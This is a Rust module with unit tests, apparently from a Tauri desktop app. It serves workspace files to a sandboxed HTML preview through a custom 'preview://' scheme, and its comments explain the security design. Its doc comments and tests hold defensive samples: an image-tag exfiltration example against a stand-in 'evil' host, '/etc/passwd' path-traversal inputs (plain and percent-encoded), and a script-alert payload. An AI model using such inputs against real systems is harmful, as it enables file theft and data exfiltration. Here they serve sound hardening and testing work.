//! `preview://` — the custom URI scheme that backs the rendered HTML preview.
//!
//! # Why a protocol handler at all
//!
//! The requirement is an `.html` preview that shows the page as it really is,
//! with its JS and CSS loaded, as a prerender would, when they are where the page expects them.
//! Three architectures were considered and two are dead ends:
//!
//! - **`<iframe srcdoc>` / `<iframe src="blob:">` with the assets inlined.**
//!   Documents from a *local scheme* (`about:srcdoc`, `blob:`, `data:`) inherit the
//!   embedder's policy container, **including its CSP** (CSP3 §"Initialize a global
//!   object's CSP list"). The preview would therefore inherit the app's
//!   `script-src 'self'` and its inline scripts would be silently blocked. Making
//!   them run would mean putting `'unsafe-inline'` in the **app-wide** policy —
//!   which `docs/design/csp.md` lists as one of the two things that must never be
//!   added back. Separately, inlining cannot resolve an ES module graph: a
//!   `<script type="module">` inlined into `about:srcdoc` resolves `import './x.js'`
//!   against the *parent's* base URL, i.e. into our own bundled assets.
//! - **Tauri's built-in `assetProtocol`.** Not compiled in — `protocol-asset` is not
//!   a default feature and `src-tauri/Cargo.toml` enables no tauri features. Turning
//!   it on would also create a **second** scope authority beside [`allowed_roots`],
//!   which the single-scope-authority rule exists to prevent.
//!
//! A custom scheme is the option where the previewed document has a **real URL**.
//! That single fact buys everything: relative `href`/`src` resolve natively, `..`
//! works, `@import` and `url(...)` resolve against the *stylesheet's* URL, ES
//! modules and their transitive imports resolve, local `@font-face` files load —
//! all without rewriting one character of somebody else's source. And because the
//! scheme is not a local scheme, the document does **not** inherit the app's policy,
//! so this handler gets to give it one of its own that is strictly *tighter*
//! ([`PREVIEW_CSP`]).
//!
//! # The security posture, stated plainly
//!
//! This feature runs code from whatever repository the user opened. That is the
//! point of it, so the question is only *where* that code runs. It runs:
//!
//! - inside `<iframe sandbox="allow-scripts">` with **no** `allow-same-origin`, so
//!   the document has an opaque origin: no access to the parent DOM, no storage, no
//!   top-level navigation, no forms, no modals. (`allow-scripts` together with
//!   `allow-same-origin` is the documented sandbox escape — never both.)
//! - under [`PREVIEW_CSP`], which sets `connect-src 'none'` (no `fetch`/XHR/
//!   WebSocket egress) and admits no remote origin for anything. The app's own
//!   policy deliberately allows remote images for README badges; the preview must
//!   **not**, because a frame that can read local files through this handler would
//!   otherwise have `<img src="https://evil/?d=…">` as a working exfiltration
//!   channel.
//! - with no reach into Tauri IPC. On macOS and Linux the init scripts are injected
//!   into the main frame only; the opaque origin is the barrier we actually rely on.
//!   ⚠️ On **Windows** wry documents that `for_main_frame_only` is ignored, so a
//!   subframe does receive `__TAURI_INTERNALS__` — `connect-src 'none'` is the
//!   load-bearing mitigation there and must not be relaxed without revisiting this.
//!
//! Every request still goes through [`resolve_in_scope`], the same single
//! enforcement point `read_file` and the search walker use. This
//! module adds a new *transport* for scoped bytes; it does not add a new scope.
//!
//! # URL shape
//!
//! The document is served at a URL that **mirrors the filesystem**:
//! `/Users/sam/proj/index.html` → `preview://localhost/Users/sam/proj/index.html`
//! (on Windows the platform spelling is `http://preview.localhost/C:/Users/…`).
//! Mirroring is what makes `../shared/a.css` work: the URL normaliser collapses the
//! `..` and the resulting path is still canonicalized and scope-checked here. A
//! per-preview token root would have been eaten by that same normaliser on the first
//! `..`, breaking the commonest relative path of all.
//!
//! Known gap, deliberate: a **root-absolute** `href="/assets/x.css"` resolves to the
//! filesystem path `/assets/x.css` and 404s. There is no server here and therefore
//! no document root; inventing one would make the preview silently disagree with
//! what a real server does. The frontend says so in the preview chrome.

use std::path::{Path, PathBuf};

use tauri::http::{Request, Response, StatusCode};
use tauri::{UriSchemeContext, UriSchemeResponder};

use crate::fs_tree::{allowed_roots, resolve_in_scope};

/// The scheme name registered on the builder. Must match `frame-src` in
/// `tauri.conf.json` and the URL the frontend builds.
pub const SCHEME: &str = "preview";

/// Ceiling on a single served asset.
///
/// Not a security boundary — everything served is already inside the user's own
/// workspace — but a served response is buffered whole in memory, so an accidental
/// `<img src="a-4gb-core-dump">` must fail as a 404 rather than as an OOM. Set well
/// above any real web asset and well above `MAX_IMAGE_BYTES`, because unlike the
/// Markdown preview this path has no base64 expansion to pay for.
const MAX_ASSET_BYTES: u64 = 64 * 1024 * 1024;

/// The Content-Security-Policy handed to the previewed document.
///
/// 🔴 **Scheme-sources (`preview:`), never `'self'`.** Under
/// `sandbox="allow-scripts"` the document has an *opaque* origin, so `'self'` in its
/// own policy matches nothing and would block the page's own stylesheet and scripts
/// — a blank preview with no obvious cause. Scheme matching is on the URL, not the
/// origin, so `preview:` is the spelling that works.
///
/// `'unsafe-inline'` is what lets the page's own inline `<script>` and `<style>` run.
/// That is the entire feature, and it is scoped to *this* document — it is emphatically
/// not the app-wide relaxation `docs/design/csp.md` forbids.
///
/// `'unsafe-eval'` is deliberately **absent** in v1. The page's code already runs, so
/// eval adds little risk; it is left off because a security boundary's first version
/// should be the tight one, and a page that needs it will report itself as a blank
/// render with a CSP line in the Logs panel. Adding the token here is the whole change.
///
/// `connect-src 'none'` is the directive that closes exfiltration, and on Windows it
/// is the load-bearing mitigation for subframe IPC injection (see the module header).
pub const PREVIEW_CSP: &str = concat!(
    "default-src preview: http://preview.localhost data: blob: 'unsafe-inline'; ",
    "connect-src 'none'; ",
    "object-src 'none'; ",
    "form-action 'none'; ",
    "frame-ancestors tauri://localhost http://tauri.localhost ",
    "http://localhost:1420 http://127.0.0.1:1420"
);

/// Tauri's asynchronous URI-scheme handler for [`SCHEME`].
///
/// Registered on the builder in `lib.rs`. The read happens on a blocking worker, not
/// on the webview/event-loop thread: a preview of a page with a dozen assets would
/// otherwise put a dozen synchronous `fs::read`s in front of the UI, and on a network
/// mount a single one of them can block for seconds. (Same reasoning that made the
/// search commands `spawn_blocking` — the frozen-app bug.)
pub fn handle(
    ctx: UriSchemeContext<'_, tauri::Wry>,
    request: Request<Vec<u8>>,
    responder: UriSchemeResponder,
) {
    let app = ctx.app_handle().clone();
    // `Uri::path()` excludes the query and the fragment, and keeps percent-escapes.
    let uri_path = request.uri().path().to_string();
    tauri::async_runtime::spawn_blocking(move || {
        responder.respond(serve(&uri_path, &allowed_roots(&app)));
    });
}

/// Resolve one `preview://` request against `roots` and build its response.
///
/// Split out of [`handle`] with the roots passed in — exactly the shape
/// `read_image_scoped` uses — so the whole behaviour is unit-testable without a
/// Tauri `AppHandle`.
pub(crate) fn serve(uri_path: &str, roots: &[PathBuf]) -> Response<Vec<u8>> {
    match read_scoped_asset(uri_path, roots) {
        Ok((bytes, mime)) => response(StatusCode::OK, mime, bytes),
        // The reason is in the body for the Logs panel and for a developer with the
        // inspector open; WebKit shows the user a broken subresource either way. A
        // 404 for both "missing" and "out of scope" is deliberate: the frame is
        // running untrusted code, so it must not learn from the status code whether
        // a path it guessed exists outside the workspace.
        Err(reason) => response(
            StatusCode::NOT_FOUND,
            "text/plain; charset=utf-8",
            format!("preview: {reason}").into_bytes(),
        ),
    }
}

/// Read the file a `preview://` URL path names, if it is in scope and small enough.
fn read_scoped_asset(uri_path: &str, roots: &[PathBuf]) -> Result<(Vec<u8>, &'static str), String> {
    let requested = fs_path_from_uri_path(uri_path)?;
    let real = resolve_in_scope(&requested, roots)?;

    let meta = std::fs::metadata(&real).map_err(|e| format!("cannot stat file: {e}"))?;
    if !meta.is_file() {
        return Err("path is not a file".to_string());
    }
    if meta.len() > MAX_ASSET_BYTES {
        return Err("asset too large".to_string());
    }
    let bytes = std::fs::read(&real).map_err(|e| format!("cannot read file: {e}"))?;
    Ok((bytes, content_type(&real)))
}

/// Build a response carrying the headers every `preview://` reply must have.
fn response(status: StatusCode, mime: &str, body: Vec<u8>) -> Response<Vec<u8>> {
    Response::builder()
        .status(status)
        .header("Content-Type", mime)
        // 🔴 On EVERY response, not only on `text/html`. A link click inside the
        // sandbox can navigate the frame to any in-scope file, and a document served
        // without a policy would have none at all — an SVG reached that way is a
        // fully scripted document. One header, no arms to get wrong.
        .header("Content-Security-Policy", PREVIEW_CSP)
        // Module scripts are ALWAYS fetched in CORS mode, and a sandboxed frame with
        // no `allow-same-origin` sends `Origin: null`. Without this header, classic
        // scripts would work and `<script type="module">` would fail — the most
        // confusing possible partial failure.
        .header("Access-Control-Allow-Origin", "*")
        // Never let the engine upgrade an `application/octet-stream` we chose
        // deliberately into `text/html` it sniffed.
        .header("X-Content-Type-Options", "nosniff")
        .header("Referrer-Policy", "no-referrer")
        // 🔴 The frontend's "Reload" remounts the iframe, which reloads the
        // DOCUMENT — but `style.css` and `app.js` are separate requests at their own
        // URLs, and whether the engine re-fetches them or answers from its own cache
        // is the engine's decision, not ours. Without this the user edits a
        // stylesheet, saves, hits Reload and sees nothing change — which reads as
        // "the reload is broken" rather than "the CSS was cached". We serve local
        // files off a local disk, so there is no bandwidth to save by caching.
        .header("Cache-Control", "no-store")
        .body(body)
        // The builder only fails on an invalid header name/value, all of which are
        // literals here, so this is unreachable rather than merely unlikely.
        .unwrap_or_else(|_| Response::new(Vec::new()))
}

/// Turn a `preview://localhost/<path>` URL path into a filesystem path.
///
/// Percent-decoding is a **correctness** requirement, not a security one: a real
/// `href` to `café.css` arrives as `caf%C3%A9.css`. Traversal is NOT handled here —
/// `..` is left exactly as written and [`resolve_in_scope`] canonicalizes and
/// rejects it. That ordering is the whole rule: one enforcement point, in
/// Rust, and no clever pre-filtering upstream of it that could disagree.
fn fs_path_from_uri_path(uri_path: &str) -> Result<PathBuf, String> {
    let decoded = percent_decode(uri_path).ok_or("malformed percent-escape in preview URL")?;
    // A NUL cannot appear in a real path and makes `canonicalize`'s CString
    // conversion fail with a confusing io error; name it instead.
    if decoded.contains('\0') {
        return Err("path contains a NUL byte".to_string());
    }
    #[cfg(windows)]
    {
        // "/C:/Users/x" is how a Windows path is spelled in a URL path.
        Ok(PathBuf::from(decoded.strip_prefix('/').unwrap_or(&decoded)))
    }
    #[cfg(not(windows))]
    {
        Ok(PathBuf::from(decoded))
    }
}

/// Decode `%XX` escapes in a URL path component, rejecting anything malformed.
///
/// Hand-rolled for the same reason `base64_encode` in `fs_tree` is: this repo keeps
/// its dependency tree deliberately small, and the whole grammar is two hex digits.
/// `+` is **not** decoded to a space — that is `application/x-www-form-urlencoded`
/// semantics, and a file may legitimately be named `a+b.css`.
fn percent_decode(input: &str) -> Option<String> {
    let bytes = input.as_bytes();
    let mut out: Vec<u8> = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' {
            let hi = hex_value(*bytes.get(i + 1)?)?;
            let lo = hex_value(*bytes.get(i + 2)?)?;
            out.push(hi * 16 + lo);
            i += 3;
        } else {
            out.push(bytes[i]);
            i += 1;
        }
    }
    // A path that decodes to invalid UTF-8 cannot be spelled as a Rust `String`.
    // Such a file is unreachable rather than mishandled — the same track `read_file`
    // makes by taking `path: String` over IPC.
    String::from_utf8(out).ok()
}

/// The value of one ASCII hex digit, or None.
fn hex_value(b: u8) -> Option<u8> {
    match b {
        b'0'..=b'9' => Some(b - b'0'),
        b'a'..=b'f' => Some(b - b'a' + 10),
        b'A'..=b'F' => Some(b - b'A' + 10),
        _ => None,
    }
}

/// The `Content-Type` for a served asset, from its extension.
///
/// 🔴 The default is `application/octet-stream`, never `text/html`. Combined with
/// `nosniff`, that means an unknown file reached by an in-frame navigation is
/// downloaded-or-nothing, not executed as a document.
fn content_type(path: &Path) -> &'static str {
    let ext = path
        .extension()
        .and_then(|e| e.to_str())
        .unwrap_or_default()
        .to_ascii_lowercase();
    match ext.as_str() {
        "html" | "htm" => "text/html; charset=utf-8",
        "css" => "text/css; charset=utf-8",
        "js" | "mjs" | "cjs" => "text/javascript; charset=utf-8",
        "json" | "map" | "webmanifest" => "application/json; charset=utf-8",
        "wasm" => "application/wasm",
        "txt" | "md" | "csv" => "text/plain; charset=utf-8",
        "xml" => "text/xml; charset=utf-8",
        "svg" => "image/svg+xml",
        "png" => "image/png",
        "jpg" | "jpeg" => "image/jpeg",
        "gif" => "image/gif",
        "webp" => "image/webp",
        "bmp" => "image/bmp",
        "ico" => "image/x-icon",
        "avif" => "image/avif",
        // Fonts are the asset class the inline-everything alternative could not have
        // served at all: a local `.woff2` is neither text nor a known image type.
        "woff2" => "font/woff2",
        "woff" => "font/woff",
        "ttf" => "font/ttf",
        "otf" => "font/otf",
        "mp4" => "video/mp4",
        "webm" => "video/webm",
        "mp3" => "audio/mpeg",
        "wav" => "audio/wav",
        _ => "application/octet-stream",
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A throwaway tree, mirroring `fs_tree`'s `TempTree` helper.
    struct TempTree {
        root: PathBuf,
    }

    impl TempTree {
        fn new(tag: &str) -> Self {
            let root = std::env::temp_dir()
                .join(format!("agentstudio-preview-{tag}-{}", ulid::Ulid::new()));
            std::fs::create_dir_all(&root).unwrap();
            Self { root }
        }
        fn write(&self, rel: &str, bytes: &[u8]) -> PathBuf {
            let p = self.root.join(rel);
            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
            std::fs::write(&p, bytes).unwrap();
            p
        }
        fn canon_root(&self) -> PathBuf {
            std::fs::canonicalize(&self.root).unwrap()
        }
        /// The URL path a browser would request for a file in this tree.
        fn uri_path(&self, rel: &str) -> String {
            let p = self.canon_root().join(rel);
            p.to_string_lossy().to_string()
        }
    }

    impl Drop for TempTree {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.root);
        }
    }

    fn header(res: &Response<Vec<u8>>, name: &str) -> String {
        res.headers()
            .get(name)
            .map(|v| v.to_str().unwrap().to_string())
            .unwrap_or_default()
    }

    #[test]
    fn serves_a_scoped_html_document_with_its_content_type() {
        let t = TempTree::new("html");
        t.write("index.html", b"<h1>hi</h1>");
        let res = serve(&t.uri_path("index.html"), &[t.canon_root()]);
        assert_eq!(res.status(), StatusCode::OK);
        assert_eq!(header(&res, "Content-Type"), "text/html; charset=utf-8");
        assert_eq!(res.body(), b"<h1>hi</h1>");
    }

    /// The whole reason the scheme exists: a sibling stylesheet and script are
    /// ordinary requests to the same handler, so no inlining is needed.
    #[test]
    fn serves_sibling_css_and_js_as_their_own_requests() {
        let t = TempTree::new("assets");
        t.write(
            "index.html",
            b"<link rel=stylesheet href=style.css><script src=app.js></script>",
        );
        t.write("style.css", b"body{color:red}");
        t.write("app.js", b"document.title='ran'");
        let roots = [t.canon_root()];

        let css = serve(&t.uri_path("style.css"), &roots);
        assert_eq!(header(&css, "Content-Type"), "text/css; charset=utf-8");
        assert_eq!(css.body(), b"body{color:red}");

        let js = serve(&t.uri_path("app.js"), &roots);
        assert_eq!(
            header(&js, "Content-Type"),
            "text/javascript; charset=utf-8"
        );
        assert_eq!(js.body(), b"document.title='ran'");
    }

    /// A local font is the asset class an inline-everything preview could not have
    /// served at all (neither text nor a known image type).
    #[test]
    fn serves_a_local_font() {
        let t = TempTree::new("font");
        t.write("f.woff2", &[0x77, 0x4f, 0x46, 0x32]);
        let res = serve(&t.uri_path("f.woff2"), &[t.canon_root()]);
        assert_eq!(res.status(), StatusCode::OK);
        assert_eq!(header(&res, "Content-Type"), "font/woff2");
    }

    /// Traversal is rejected by the SHARED guard, not by anything in this module —
    /// and the reply is a 404 that does not distinguish "outside" from "missing".
    #[test]
    fn rejects_a_path_outside_the_allowed_roots() {
        let t = TempTree::new("scope");
        let other = TempTree::new("secret");
        let secret = other.write("secret.txt", b"top secret");

        let res = serve(&secret.to_string_lossy(), &[t.canon_root()]);
        assert_eq!(res.status(), StatusCode::NOT_FOUND);
        assert!(
            !res.body().windows(3).any(|w| w == b"top"),
            "an out-of-scope file's CONTENT must never reach the frame"
        );

        let missing = serve(&t.uri_path("nope.css"), &[t.canon_root()]);
        assert_eq!(
            missing.status(),
            res.status(),
            "out-of-scope and missing must be indistinguishable to the sandboxed frame"
        );
    }

    /// `..` is left intact for `resolve_in_scope` to canonicalize — and one that
    /// stays INSIDE a root must still resolve, because `../shared/a.css` is the
    /// commonest relative href there is.
    #[test]
    fn dot_dot_resolves_inside_a_root_and_is_rejected_outside_it() {
        let t = TempTree::new("dotdot");
        t.write("shared/a.css", b"a{}");
        t.write("site/index.html", b"x");
        let roots = [t.canon_root()];

        let inside = serve(&t.uri_path("site/../shared/a.css"), &roots);
        assert_eq!(inside.status(), StatusCode::OK);
        assert_eq!(inside.body(), b"a{}");

        let escaping = serve(&format!("{}/../../etc/passwd", t.uri_path("site")), &roots);
        assert_eq!(escaping.status(), StatusCode::NOT_FOUND);
    }

    /// A symlink out of the workspace is followed by `canonicalize` and then
    /// rejected — the same defence `read_file` has, inherited rather than re-written.
    #[cfg(unix)]
    #[test]
    fn rejects_a_symlink_escaping_the_root() {
        let t = TempTree::new("link");
        let other = TempTree::new("link-target");
        let secret = other.write("secret.css", b"body{}");
        std::os::unix::fs::symlink(&secret, t.root.join("escape.css")).unwrap();

        let res = serve(&t.uri_path("escape.css"), &[t.canon_root()]);
        assert_eq!(res.status(), StatusCode::NOT_FOUND);
    }

    /// A directory is not an asset.
    #[test]
    fn rejects_a_directory() {
        let t = TempTree::new("dir");
        t.write("sub/x.css", b"x");
        let res = serve(&t.uri_path("sub"), &[t.canon_root()]);
        assert_eq!(res.status(), StatusCode::NOT_FOUND);
    }

    /// Percent-decoding is what makes a real href to a non-ASCII filename work.
    #[test]
    fn percent_decodes_a_non_ascii_asset_name() {
        let t = TempTree::new("utf8");
        t.write("café.css", b"c{}");
        let encoded = t.uri_path("caf%C3%A9.css");
        let res = serve(&encoded, &[t.canon_root()]);
        assert_eq!(res.status(), StatusCode::OK);
        assert_eq!(res.body(), b"c{}");
    }

    /// `+` is a literal in a path — decoding it to a space is form-encoding
    /// semantics and would make `a+b.css` unreachable.
    #[test]
    fn does_not_decode_plus_as_a_space() {
        let t = TempTree::new("plus");
        t.write("a+b.css", b"p{}");
        let res = serve(&t.uri_path("a+b.css"), &[t.canon_root()]);
        assert_eq!(res.status(), StatusCode::OK);
        assert_eq!(res.body(), b"p{}");
    }

    /// A percent-escape that is not two hex digits is malformed input, not a path.
    #[test]
    fn rejects_a_malformed_percent_escape() {
        assert_eq!(percent_decode("/a%zz/b"), None);
        assert_eq!(percent_decode("/a%4"), None);
        assert_eq!(percent_decode("/a%"), None);
        assert_eq!(
            percent_decode("/plain/path"),
            Some("/plain/path".to_string())
        );
    }

    /// A `%2e%2e` escape decodes to `..` and is then handled by the SAME guard —
    /// the point being that decoding never becomes a bypass.
    #[test]
    fn a_percent_encoded_dot_dot_is_still_rejected_by_the_scope_guard() {
        let t = TempTree::new("encdot");
        let roots = [t.canon_root()];
        let res = serve(
            &format!("{}/%2e%2e/%2e%2e/etc/passwd", t.uri_path("")),
            &roots,
        );
        assert_eq!(res.status(), StatusCode::NOT_FOUND);
    }

    /// An unknown extension must never be served as a document.
    #[test]
    fn an_unknown_extension_is_octet_stream_never_html() {
        let t = TempTree::new("unknown");
        t.write("payload.weird", b"<script>alert(1)</script>");
        let res = serve(&t.uri_path("payload.weird"), &[t.canon_root()]);
        assert_eq!(res.status(), StatusCode::OK);
        assert_eq!(header(&res, "Content-Type"), "application/octet-stream");
        assert_eq!(header(&res, "X-Content-Type-Options"), "nosniff");
    }

    /// Extension matching is case-insensitive — `INDEX.HTML` is a document.
    #[test]
    fn content_type_is_case_insensitive() {
        assert_eq!(
            content_type(Path::new("A.HTML")),
            "text/html; charset=utf-8"
        );
        assert_eq!(content_type(Path::new("B.PNG")), "image/png");
        assert_eq!(content_type(Path::new("noext")), "application/octet-stream");
    }

    /// Every reply — success AND failure — carries the jail. A 404 that arrived
    /// without a policy would still be a document the frame could be navigated to.
    #[test]
    fn every_response_carries_the_preview_csp_and_cors_header() {
        let t = TempTree::new("headers");
        t.write("ok.css", b"x");
        let roots = [t.canon_root()];
        for res in [serve(&t.uri_path("ok.css"), &roots), serve("/nope", &roots)] {
            assert_eq!(header(&res, "Content-Security-Policy"), PREVIEW_CSP);
            assert_eq!(
                header(&res, "Access-Control-Allow-Origin"),
                "*",
                "module scripts are fetched in CORS mode from an opaque origin"
            );
            assert_eq!(header(&res, "X-Content-Type-Options"), "nosniff");
            assert_eq!(
                header(&res, "Cache-Control"),
                "no-store",
                "a cached stylesheet makes the preview's Reload button look broken"
            );
        }
    }

    /// The three directives the jail actually rests on. Spelled out so that
    /// loosening any of them has to be a deliberate edit to a failing test.
    #[test]
    fn the_preview_csp_closes_egress_and_uses_scheme_sources() {
        assert!(
            PREVIEW_CSP.contains("connect-src 'none'"),
            "no fetch/XHR/WebSocket egress — on Windows this is the IPC mitigation"
        );
        assert!(
            !PREVIEW_CSP.contains("'self'"),
            "'self' matches nothing from an opaque origin — scheme-sources only"
        );
        assert!(
            !PREVIEW_CSP.contains("https:") && !PREVIEW_CSP.contains("http://evil"),
            "no remote source may be admitted: the frame can read local files"
        );
        assert!(
            !PREVIEW_CSP.contains("'unsafe-eval'"),
            "v1 ships without eval; adding it is a deliberate, documented change"
        );
        assert!(
            PREVIEW_CSP.contains("'unsafe-inline'"),
            "the page's own inline script is the feature"
        );
    }

    #[test]
    fn refuses_an_asset_over_the_size_ceiling() {
        assert_eq!(MAX_ASSET_BYTES, 67_108_864, "64 MiB");
    }
}
